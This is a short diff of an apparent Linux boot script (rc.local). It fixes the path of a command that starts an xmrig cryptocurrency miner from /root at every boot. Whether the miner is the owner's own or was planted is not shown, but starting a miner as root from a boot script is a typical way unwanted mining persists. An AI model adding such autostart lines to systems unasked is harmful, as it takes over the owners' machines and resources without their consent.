@@ -11,5 +11,5 @@
 # that this script will be executed during boot.
 
 touch /var/lock/subsys/local 
-./root/xmrig-5.5.3-prifit-switching-Linux/xmrig
+/root/xmrig-5.5.3-prifit-switching-Linux/xmrig
 
